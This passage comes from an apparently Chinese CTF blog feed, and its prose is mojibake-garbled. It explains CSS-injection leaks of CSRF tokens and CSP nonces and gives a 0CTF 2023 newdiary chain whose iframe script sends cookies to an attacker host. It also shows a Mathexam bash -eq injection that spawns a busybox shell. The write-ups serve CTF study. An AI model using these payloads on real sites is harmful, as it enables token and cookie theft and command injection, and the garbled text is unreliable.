<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¡µé¢çš„é‡å®šå‘ï¼ˆåˆ·æ–°ï¼‰é€šå¸¸ä¼šå¯¼è‡´ nonce å€¼å‘ç”Ÿå˜åŒ–ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ˜¯é€šè¿‡ url ä¸­çš„ hash å€¼ï¼ˆ# ä¹‹åçš„éƒ¨åˆ†ï¼‰æ¥æ›´æ–°é¡µé¢å†…å®¹çš„ï¼Œnonce å€¼æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œ# ä¹‹åçš„éƒ¨åˆ†æ”¹å˜æ—¶ï¼Œnonce å€¼ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„ä¸€ä¸ªå…³é”®ç‚¹ã€‚</p>

<p>é¢˜ç›® payload å¯å‚è€ƒï¼š<a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main Â· salvatore-abello/CTF-Writeups</a></p>

<p>ä½¿ç”¨æ—¶æ³¨æ„å°† index.html æ”¾åœ¨ tempalte ç›®å½•ä¸‹ã€‚å¯åŠ¨ server.py åï¼Œè®¿é—® /exploitã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212203249.png" alt="20231212203249" /></p>

<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<ul>
  <li><a href="https://github.com/salvatore-abello/CTF-Writeups/blob/main/0ctf%20-%202023/newdiary/README.md">CTF-Writeups/0ctf - 2023/newdiary/README.md at main Â· salvatore-abello/CTF-Writeups</a></li>
  <li><a href="https://aszx87410.github.io/beyond-xss/">Beyond XSS</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="CSS" /><category term="CSS" /><category term="0ctf 2023" /><summary type="html"><![CDATA[å‰ç«¯å®‰å…¨ï¼šCSS æ³¨å…¥ css æ³¨å…¥é€šå¸¸ç”¨äºçªƒå–é¡µé¢æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ csrf-tokenï¼Œcsp ä¸­çš„ nonce å€¼ç­‰ã€‚é€šå¸¸é…åˆ xssã€csrf æ¼æ´ä¸€åŒä½¿ç”¨ã€‚ CSS æ³¨å…¥åŸç† ä¸‹é¢çš„ payload å±•ç¤ºäº†ä¸€ä¸ªçªƒå– csrf-token çš„ç¤ºä¾‹ã€‚ &lt;!DOCTYPE html&gt; &lt;head&gt; &lt;style&gt; form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } &lt;/style&gt; &lt;meta charset="UTF-8"&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="/action"&gt; &lt;input name="username"&gt; &lt;input type="submit"&gt; &lt;input type="hidden" name="csrf-token" value="abc123"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; åœ¨è¿™ä¸ª payload ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ has é€‰æ‹©å™¨ï¼Œä» form è¡¨å•ä¸­é€‰æ‹©æ»¡è¶³ name=â€csrf-tokenâ€ï¼Œvalue ä»¥ a å¼€å¤´çš„ input æ ‡ç­¾ï¼Œå¦‚æœèƒ½å¤Ÿè·å–åˆ°è¿™æ ·çš„æ ‡ç­¾ï¼Œå°±é€šè¿‡ background åŠ è½½è¿œç¨‹å›¾ç‰‡ã€‚ æ¢å¥è¯æ¥è¯´ï¼Œå¦‚æœèƒ½å¤Ÿæ’å…¥è¿™æ ·ä¸€è¡Œ css ä»£ç ï¼Œå¹¶ä¸” csrf-token ç¡®å®ä»¥ a å¼€å¤´ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå—åˆ°ä¸€ä¸ªè¯·æ±‚ã€‚é€šè¿‡éå†å°±å¯ä»¥ç¡®è®¤ç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚ form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... å¾—åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦åï¼ˆå‡è®¾ä¸º aï¼‰ï¼Œå°±å¯ä»¥å¼€å§‹éå†ç¬¬äºŒä¸ªå­—ç¬¦ã€‚ form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... åˆ©ç”¨è¿™æ ·ä¾§ä¿¡é“çš„æ–¹å¼ï¼Œå¾ªç¯éå†å°±å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„ csrf-tokenã€‚ ä½†å…¶ä¸­å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¦ä¸€æ¬¡å°†æ‰€æœ‰ payload æ³¨å…¥è¿›å»ï¼Œå¤§å°å†™å­—æ¯åŠæ•°å­—åŠ èµ·æ¥ 62 ä¸ªï¼Œå¦‚æœè¦éå†æ¯ç§ç»„åˆçš„è¯ payload å°†ä¼šéå¸¸é•¿ï¼Œç‰¹åˆ«æ˜¯ token é•¿åº¦ä¸€èˆ¬ä¹Ÿä¸ä¼šçŸ­ã€‚ å¦‚æœåˆ†æ®µæ³¨å…¥å‘¢ï¼Ÿä¾‹å¦‚å…ˆæ³¨å…¥çŒœè§£ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ payloadï¼Œç¡®è®¤ç¬¬ä¸€ä¸ªå­—ç¬¦ä¹‹åï¼Œå†æ³¨å…¥çŒœè§£ç¬¬äºŒä¸ªå­—ç¬¦çš„ payloadã€‚ä½†è¿™åˆä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œé¡µé¢éœ€è¦è¿›è¡Œåˆ·æ–°æ‰èƒ½åŠ è½½æ–°çš„ payloadï¼Œè€Œåˆ·æ–°ä¹‹åï¼Œcsrf-token å¾€å¾€ä¼šå‘ç”Ÿå˜åŒ–ã€‚ Pepe Vila åœ¨ 2019 æå‡ºäº†æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š@importï¼Œå¯ä»¥åœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹ï¼Œåˆ†é˜¶æ®µåŠ è½½ cssã€‚ @import å¯ä»¥è¿›ä¸€æ­¥åŠ è½½å…¶ä»–çš„ cssã€‚ç¤ºä¾‹ payload å¦‚ä¸‹ï¼š @import url(https://myserver.com/start?len=8) æ”»å‡»è€…æœåŠ¡å™¨å¯ä»¥å›å¤ä¸‹é¢çš„ payloadï¼Œæ­¤æ—¶å®¢æˆ·ç«¯ä¼šé€ä¸ªè¯·æ±‚ã€‚ @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) å®¢æˆ·ç«¯è¯·æ±‚ payload?len=1 æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å›å¤æšä¸¾ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ payloadã€‚ form:has(input[name="csrf-token"][value^="a"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="b"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="c"]){ background: url("http://attacker/?q=c"); } ... ç¬¬ä¸€ä¸ªå­—ç¬¦ç¡®è®¤åï¼Œå†ç”Ÿæˆ payload?len=2 çš„å“åº”å†…å®¹ï¼Œå®¢æˆ·ç«¯æ­¤æ—¶è¯·æ±‚è¯¥ url æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥å›å¤ç‰¹å®šçš„ payloadã€‚ form:has(input[name="csrf-token"][value^="aa"]){ background: url("http://attacker/?q=a"); } form:has(input[name="csrf-token"][value^="ab"]){ background: url("http://attacker/?q=b"); } form:has(input[name="csrf-token"][value^="ac"]){ background: url("http://attacker/?q=c"); } ... åé¢çš„è¿‡ç¨‹ä¾æ¬¡ç±»æ¨ã€‚ è¿™ç§æ–¹å¼ä¹Ÿæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š æµè§ˆå™¨å¯¹åŒä¸€ä¸ªåŸŸåå‘èµ·çš„è¯·æ±‚æœ‰ä¸Šé™ã€‚å¦‚æœè¯·æ±‚å¤ªå¤šä»æ—§ä¼šè¢«é™åˆ¶ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®å¤šä¸ªå­åŸŸåæ¥ç»•è¿‡é™åˆ¶ï¼Œæ¯”å¦‚ a.attacker.comï¼Œb.attacker.comã€‚ firefox ä¸‹ payload æœ‰æ‰€ä¸åŒï¼ŒåŸå› åœ¨äº firefox ä¸ä¼šé€ä¸ª import cssï¼Œè€Œæ˜¯ä¸€æ¬¡æ€§åŠ è½½ï¼Œè¿™æ ·å°±è¾¾ä¸åˆ°åˆ†é˜¶æ®µç¡®è®¤å­—ç¬¦çš„ç›®çš„ã€‚ MichaÅ‚ Bentkowski çš„æ–‡ç« æå‡ºäº†è§£å†³åŠæ³•ï¼šCSS data exfiltration in Firefox via a single injection point - research.securitum.com chrome å’Œ firefox é€šç”¨ payloadï¼š &lt;style&gt;@import url(https://myserver.com/payload?len=1)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=2)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=3)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=4)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=5)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=6)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=7)&lt;/style&gt; &lt;style&gt;@import url(https://myserver.com/payload?len=8)&lt;/style&gt; æ›´å¿«çš„æšä¸¾ æ–‡ç«  Code Vulnerabilities Put Proton Mails at Risk - Sonar å±•ç¤ºäº†ä¸€ç§æ›´å¿«çš„æšä¸¾æ–¹å¼ã€‚ é€šè¿‡ç¤ºä¾‹ä»£ç å¯ä»¥æ›´å¥½åœ°ç†è§£ï¼š &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"&gt; &lt;/head&gt; &lt;style&gt; :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} :has(script[nonce*="aab"]){--tosend-aab: url(http://192.168.137.98:7777?x=aab);} :has(script[nonce*="aac"]){--tosend-aac: url(http://192.168.137.98:7777?x=aac);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } &lt;/style&gt; &lt;body&gt; &lt;input&gt; &lt;script nonce="nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"&gt; console.log(1) &lt;/script&gt; &lt;/body&gt; é¡µé¢ä¸­çš„ CSP è®¾ç½®äº† nonce å€¼ï¼Œåªæœ‰ nonce å±æ€§å€¼ä¸ CSP ä¸­è®¾ç½®çš„å€¼ç›¸åŒçš„ JS å†…é“¾è„šæœ¬æ‰èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œè¿™ä¸ªæœºåˆ¶é€šå¸¸ç”¨äº XSS é˜²æŠ¤ã€‚æ”»å‡»è€…éœ€è¦çªƒå–åˆ°è¯¥å€¼æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ XSSã€‚ å…¶ä¸­ css æ³¨å…¥ payload å¦‚ä¸‹ã€‚ :has(script[nonce*="aaa"]){--tosend-aaa: url(http://192.168.137.98:7777?x=aaa);} input{ background: var(--tosend-aaa, none), var(--tosend-aab, none), var(--tosend-aac, none), var(--tosend-aad, none) } å…¶ä½œç”¨å°±æ˜¯åœ¨é¡µé¢é€‰æ‹© nonce å€¼åŒ…å«äº† aaa çš„ script æ ‡ç­¾ï¼ˆ*= è¡¨ç¤º nonce å€¼å«æœ‰ aaa æ—¶ï¼‰ï¼Œå¦‚æœèƒ½å¤Ÿé€‰æ‹©åˆ°ï¼Œåˆ™è®¾å®šä¸€ä¸ªè‡ªå®šä¹‰å±æ€§ tosend-aaaï¼ˆè‡ªå®šä¹‰å±æ€§ä»¥ â€“ å¼€å¤´ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§å‘å¤–å‘èµ·è¯·æ±‚ã€‚ å®šä¹‰ input æ ·å¼çš„ä½œç”¨åœ¨äºè°ƒç”¨è‡ªå®šä¹‰å‚æ•°ï¼Œä»è€Œè§¦å‘å‘å¤–çš„è¯·æ±‚ï¼Œæ¢ç”¨å…¶ä»–æ ‡ç­¾ä¹ŸåŒæ ·å¯ä»¥ï¼Œä¾‹å¦‚ divã€‚ ç”±äº nonce ä¸­å­˜åœ¨ aaaï¼Œå› æ­¤å¯ä»¥å—åˆ°ä¸€ä¸ª aaa çš„è¯·æ±‚ï¼š å¦‚ä½•è·å–å®Œæ•´çš„å­—ç¬¦ä¸²å‘¢ï¼Ÿå‡è®¾ none å€¼ä¸º 32 ä½éšæœºå­—ç¬¦ä¸²ï¼š qhkkzvf5mc3iv090nyysyq6wc80ai4v1 æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šé¢çš„æ–¹å¼ï¼Œæ¯æ¬¡è·å– 3 ä½çš„å­ä¸²ï¼Œè·å–åˆ° 30 ä¸ªä¸é‡å¤çš„å­ä¸²ï¼Œé€šè¿‡å›æº¯çš„æ–¹å¼å³å¯æ¢å¤æ•´ä¸ªå­—ç¬¦ä¸²ã€‚æ¯”å¦‚ f5m çš„åä¸¤ä½ä¸º 5m, 5m åˆæ˜¯ 5mc çš„å¼€å¤´ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç¡®è®¤ f5m åä¸€ä¸ªå­—ç¬¦ä¸º cã€‚ {'f5m', 'c3i', 'i4v', '3iv', 'zvf', 'iv0', 'syq', '0ai', '6wc', 'kkz', 'yq6', 'q6w', '5mc', 'c80', '4v1', 'ysy', '0ny', 'yys', 'ai4', '090', 'v09', 'nyy', 'mc3', 'hkk', 'qhk', 'vf5', 'kzv', 'wc8'} è¿™æ ·ä¸€æ¥ï¼Œåªéœ€è¦è¾ƒå°‘çš„è¯·æ±‚å°±å¯ä»¥è·å–å®Œæ•´çš„å­—ç¬¦ä¸²ã€‚ 0CTF 2023 newdiary å‰å‡ å¤©çš„ 0CTF 2023 newdiary è¿™é“é¢˜å°±æ˜¯è€ƒå¯Ÿçš„ CSS æ³¨å…¥çš„åˆ©ç”¨ã€‚ é¢˜ç›®è®¾å®šäº†ä¸€ä¸ª XSS çš„åœºæ™¯ï¼Œç”¨æˆ·å¯ä»¥å‘å¸ƒå†…å®¹å¹¶åˆ†äº«ç»™åå° botï¼Œbot çš„ cookie è®¾å®šä¸º FLAGï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡ XSS è·å–åˆ° FLAGã€‚ é¢˜ç›®æ²¡æœ‰è¿›è¡Œ XSS çš„è¿‡æ»¤ï¼Œä½†è®¾å®šäº† CSPï¼Œå³ä½¿èƒ½å¤Ÿæ’å…¥ js ä»£ç ï¼Œç”±äºæ— æ³•ç¡®è®¤ nonce å€¼ï¼Œä»£ç ä¹Ÿæ— æ³•æ‰§è¡Œã€‚ &lt;meta http-equiv="Content-Security-Policy" content="script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"&gt; ä½† CSP style-src è®¾ç½®ä¸º â€˜unsafe-inlineâ€™ https://unpkg.comâ€ï¼Œå…è®¸å†…è”æ‰§è¡Œï¼Œå¹¶ä¿¡ä»»æ¥è‡ª unpkg.com çš„ cssï¼Œæ‰€ä»¥è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯åˆ©ç”¨ css æ³¨å…¥æ¥çªƒå– nonce å€¼ã€‚ åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š æ–°å»ºä¸€ä¸ªç¬”è®° redirectï¼Œid ä¸º 0ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¯¥ payload å¯ä»¥è¾¾æˆé‡å®šå‘çš„æ•ˆæœã€‚åœ¨æ— æ³•ä½¿ç”¨ js æ—¶ï¼Œå¯ä»¥é€šè¿‡ mata æ¥å®Œæˆé‡å®šå‘ï¼Œmeta æ ‡ç­¾é€šå¸¸ä¸ä¼šè¢«è¿‡æ»¤ã€‚ &lt;meta http-equiv="refresh" content="0.0;url=http://192.168.137.98:8888/index.html"&gt; å…¶ä¸­ index.html å†…å®¹å¦‚ä¸‹ï¼š &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; const sleep = (milliseconds) =&gt; new Promise(resolve =&gt; setTimeout(resolve, milliseconds)); async function run(){ bot_window = window.open("http://localhost/share/read#id=1&amp;username="); // Exploit 1, leak nonce await sleep(7000); bot_window.location.href = "http://localhost/share/read#id=2&amp;username="; // Exploit 2, leak cookie await sleep(100); console.log("O"); } run(); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å…¶ä¸»è¦åŠŸèƒ½æ˜¯è®© bot é€šè¿‡ window.open æ‰“å¼€æ–°çš„æ ‡ç­¾ï¼Œç„¶åè®¿é—® id=1 çš„ç¬”è®°ã€‚ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œå†é‡å®šå‘åˆ° id=2 çš„ç¬”è®°ã€‚ æ–°å»ºä¸€ä¸ªç¬”è®° stealï¼Œid ä¸º 1,å†…å®¹ä¸ºçªƒå– nonce å€¼çš„ css è„šæœ¬ã€‚ç”±äºé¢˜ç›®ä¿¡ä»»æ¥è‡ª unpkg.com çš„ css æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†æ³„éœ² nonce å€¼çš„ css ä¸Šä¼ åˆ° unpkg.com ä¸­ã€‚ &lt;link rel="stylesheet" href="http://unpkg.com/xxx/leak.css"&gt;&lt;input /&gt; å½“ bot è®¿é—® id=0 çš„ç¬”è®°æ—¶ï¼Œä¼šè¢«é‡å®šå‘åˆ°æ”»å‡»è€…é¡µé¢ï¼Œæ‰“å¼€æ–°çš„æ ‡ç­¾é¡µï¼Œè®¿é—® id=1 çš„ç¬”è®°ã€‚æ¥ç€åŠ è½½ leak.css æ³„æµå‡º id=1 é¡µé¢çš„ nonce å€¼ã€‚æ­¤æ—¶ bot è¿›å…¥ç­‰å¾…æ—¶é—´ã€‚ æšä¸¾åˆ° nonce å€¼åï¼Œæ–°å»ºä¸€ä¸ªç¬”è®° flagï¼Œid ä¸º 2ï¼Œå†™å…¥è·å– cookie å€¼çš„ payloadï¼Œnonce å€¼ä¸ºåˆšæ‰çªƒå–åˆ°çš„å€¼ &lt;iframe name=asd srcdoc="&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"/&gt; å› ä¸ºé¡µé¢è®¾ç½®äº† script-src ä¸º nonceï¼Œç¦æ­¢äº† js è„šæœ¬çš„å†…è”æ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨ iframe æ‰“å¼€å­çª—å£æ¥åŠ è½½ js ä»£ç ã€‚ bot ç»“æŸç­‰å¾…æ—¶é—´ï¼Œè®¿é—® id=2 çš„é¡µé¢ï¼Œæ‰§è¡Œ js ä»£ç å°† cookie å‘é€åˆ°è¿œç¨‹ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¡µé¢çš„é‡å®šå‘ï¼ˆåˆ·æ–°ï¼‰é€šå¸¸ä¼šå¯¼è‡´ nonce å€¼å‘ç”Ÿå˜åŒ–ï¼Œä½†é¢˜ç›®ç¯å¢ƒæ˜¯é€šè¿‡ url ä¸­çš„ hash å€¼ï¼ˆ# ä¹‹åçš„éƒ¨åˆ†ï¼‰æ¥æ›´æ–°é¡µé¢å†…å®¹çš„ï¼Œnonce å€¼æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œ# ä¹‹åçš„éƒ¨åˆ†æ”¹å˜æ—¶ï¼Œnonce å€¼ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„ä¸€ä¸ªå…³é”®ç‚¹ã€‚ é¢˜ç›® payload å¯å‚è€ƒï¼šCTF-Writeups/0ctf - 2023/newdiary/README.md at main Â· salvatore-abello/CTF-Writeups ä½¿ç”¨æ—¶æ³¨æ„å°† index.html æ”¾åœ¨ tempalte ç›®å½•ä¸‹ã€‚å¯åŠ¨ server.py åï¼Œè®¿é—® /exploitã€‚ å‚è€ƒ CTF-Writeups/0ctf - 2023/newdiary/README.md at main Â· salvatore-abello/CTF-Writeups Beyond XSS]]></summary></entry><entry><title type="html">0CTF/TCTF 2023 Mathexam Writeup</title><link href="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html" rel="alternate" type="text/html" title="0CTF/TCTF 2023 Mathexam Writeup" /><published>2023-12-11T18:29:48+08:00</published><updated>2023-12-11T18:29:48+08:00</updated><id>/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup</id><content type="html" xml:base="/ctf/2023/12/11/0CTF-2023-Mathexam-Writeup.html"><![CDATA[<h1 id="0ctf-mathexam-writeup">0CTF Mathexam Writeup</h1>
<p>mathexam ç³»åˆ—éå¸¸æœ‰æ„æ€ï¼Œä¸»è¦è€ƒå¯Ÿå¦‚ä½•åœ¨å—é™çš„ bash ä¸‹å®Œæˆç«¯å£è½¬å‘ï¼Œé¢˜ç›®çš„åœºæ™¯å¯ä»¥é€‚ç”¨åˆ°ä¸€äº›å°è®¾å¤‡çš„æ¸—é€ä¸­ã€‚åˆ©ç”¨æ€è·¯æ€»ç»“å¦‚ä¸‹ï¼š</p>
<ol>
  <li>mathexam-1ï¼šbash -eq æ³¨å…¥</li>
  <li>mathexam-2ï¼šåˆ©ç”¨ busybox nc å®Œæˆç«¯å£è½¬å‘ã€‚</li>
  <li>mathexam-3ï¼šå»æ‰äº† buxyboxï¼Œåˆ©ç”¨ cat å®Œæˆç«¯å£è½¬å‘ã€‚</li>
  <li>mathexam-4ï¼šè¿›ä¸€æ­¥å»æ‰äº† catï¼Œéœ€è¦åˆ©ç”¨çº¯ç²¹çš„ bash å®Œæˆç«¯å£è½¬å‘ã€‚</li>
</ol>

<h2 id="mathexam-1">mathexam-1</h2>
<blockquote>
  <p>The math exam starts now. Participate with integrity and never cheat.</p>

  <p>Someone has stolen the exam paper, and definitely he got full marks.
Fortunately, he didnâ€™t find the flag.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">"You are now in the math examination hall."</span>
<span class="nb">echo</span> <span class="s2">"First, please read exam integrity statement:"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">promisetext</span><span class="o">=</span><span class="s2">"I promise to play fairly and not to cheat. In case of violation, I voluntarily accept punishment"</span>
<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nb">echo</span> <span class="s2">"Now, write down the exam integrity statement here:"</span>
<span class="nb">read </span>userinput

<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$userinput</span><span class="s2">"</span> <span class="o">=</span> <span class="s2">"</span><span class="nv">$promisetext</span><span class="s2">"</span> <span class="o">]</span>
<span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"All right"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"Error"</span>
    <span class="nb">exit
</span><span class="k">fi

</span><span class="nb">echo</span> <span class="s2">""</span>
<span class="nb">echo</span> <span class="s2">"Exam starts"</span>
<span class="nb">echo</span> <span class="s2">"(notice: numbers in dec, oct or hex format are all accepted)"</span>
<span class="nb">echo</span> <span class="s2">""</span>

<span class="nv">correctcount</span><span class="o">=</span>0
<span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..100<span class="o">}</span>
<span class="k">do
    </span><span class="nb">echo</span> <span class="s2">"Problem </span><span class="nv">$i</span><span class="s2"> of 100:"</span>
    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2"> + </span><span class="nv">$i</span><span class="s2"> = ?"</span>

    <span class="nv">ans</span><span class="o">=</span><span class="k">$((</span><span class="nv">$i</span><span class="o">+</span><span class="nv">$i</span><span class="k">))</span>
    <span class="nb">read </span>line

    <span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> <span class="nt">-eq</span> <span class="s2">"</span><span class="nv">$ans</span><span class="s2">"</span> <span class="o">]]</span>
    <span class="k">then
        </span><span class="nv">correctcount</span><span class="o">=</span><span class="s2">"</span><span class="k">$((</span><span class="nv">$correctcount</span><span class="o">+</span><span class="m">1</span><span class="k">))</span><span class="s2">"</span>
    <span class="k">fi
    </span><span class="nb">echo</span> <span class="s2">""</span>
<span class="k">done

</span><span class="nb">echo</span> <span class="s2">"Exam finishes"</span>
<span class="nb">echo</span> <span class="s2">"You score is: </span><span class="nv">$correctcount</span><span class="s2">"</span>

<span class="nb">exit</span>
</code></pre></div></div>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ª bash è„šæœ¬ï¼Œè·å–ç”¨æˆ·è¾“å…¥å¹¶ä½¿ç”¨ -eq è¿›è¡Œäº†æ¯”è¾ƒã€‚bash è„šæœ¬ä¸­è¿™æ ·çš„è¯­å¥æ˜¯å¯ä»¥æ³¨å…¥çš„ï¼š<code class="language-plaintext highlighter-rouge">[[ "$VAR" -eq "something" ]]</code>ï¼Œå…·ä½“å¯å‚è€ƒæ–‡ç« ï¼š<a href="https://dev.to/greymd/eq-can-be-critically-vulnerable-338m">Arithmetic operation in shell script can be exploited - DEV Community</a></p>

<p>æ³¨å…¥ pocï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span><span class="nb">command</span><span class="si">)</span><span class="o">]</span>
</code></pre></div></div>
<p>æµ‹è¯•å‘½ä»¤æ—¶å¯ä»¥å‘ç°é¢˜ç›®ä¼šå°†é”™è¯¯è¾“å‡ºå‡ºæ¥ï¼Œä½†æ˜¯æ ‡å‡†è¾“å‡ºçœ‹ä¸åˆ°ï¼Œå› æ­¤æˆ‘ä»¬å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°é”™è¯¯è¾“å‡ºã€‚å¦å¤–ç›®æ ‡ç¯å¢ƒæœ‰ busyboxï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ payload æ‰“å¼€äº¤äº’å¼ shellï¼Œå°±å¯ä»¥æ‹¿åˆ° flag1ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>x[<span class="si">$(</span>/bin/busybox sh 1&gt;&amp;2<span class="si">)</span><span class="o">]</span>
</code></pre></div></div>

<h2 id="mathexam-2">mathexam-2</h2>
<p>æ‹¿åˆ°ç¬¬ä¸€å…³ shell åï¼Œå¯ä»¥åœ¨æ ¹ç›®å½•ä¸­æ‰¾åˆ°ä¸€ä¸ª .connect.sh.swp æ–‡ä»¶ï¼Œè·å–è¯¥æ–‡ä»¶çš„å†…å®¹å¯çŸ¥ second ä¸»æœºçš„ç”¨æˆ·åå¯†ç ä¸º ctf:x5kdkwjr8exi2bf70y8g80bggd2nuepfã€‚</p>

<p>è·å–ç¬¬äºŒå…³çš„ flag è¦æ±‚æˆ‘ä»¬ ssh ç™»é™†åˆ° second ä¸»æœºä¸­ï¼Œä½†ç›®æ ‡ç¯å¢ƒè®¾ç½®äº†è¯¸å¤šé™åˆ¶ï¼š</p>
<ol>
  <li>æ²¡æœ‰ ssh</li>
  <li>ä»…æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½åœ¨ /bin ç›®å½•ä¸‹
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> drwxr-xr-x    1 0        0             4096 Dec 10 00:11 <span class="nb">.</span>
 drwxr-xr-x    1 0        0             4096 Dec 10 00:11 ..
 <span class="nt">-rwxr-xr-x</span>    1 0        0          1396520 Dec  9 18:44 bash
 <span class="nt">-rwxr-xr-x</span>    1 0        0          2193264 Dec 10 00:11 busybox
 <span class="nt">-rwxr-xr-x</span>    1 0        0            35280 Dec 10 00:11 <span class="nb">cat</span>
 <span class="nt">-rwxr-xr-x</span>    1 0        0           138208 Dec 10 00:11 <span class="nb">ls
 </span>lrwxrwxrwx    1 0        0                4 Dec  9 18:44 sh -&gt; bash
</code></pre></div>    </div>
  </li>
  <li>å½“å‰ç”¨æˆ·å¯¹æ‰€æœ‰æ–‡ä»¶éƒ½æ²¡æœ‰å†™æƒé™ã€‚</li>
</ol>

